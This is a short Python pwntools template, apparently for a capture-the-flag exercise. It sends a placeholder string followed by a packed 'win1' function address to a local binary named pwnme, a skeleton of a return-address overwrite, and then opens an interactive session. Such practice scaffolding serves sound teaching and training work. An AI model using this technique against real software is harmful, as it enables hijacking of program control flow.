#!/usr/bin/env python3
# usage: python3 pwntools_boilerplate.py
from pwn import *

e = ELF('./pwnme')

p = process('./pwnme')
# alternative option to run the binary in gdb while debugging
# p = gdb.debug('./pwnme', gdbscript=''''\
# b main
# c
# ''')

payload = b''

payload += b'John'   # your payload here! 

payload += p32(0x80491e0)  # win1 function address


p.sendline(payload) # send the payload
p.interactive() # make the process interactive in the terminal

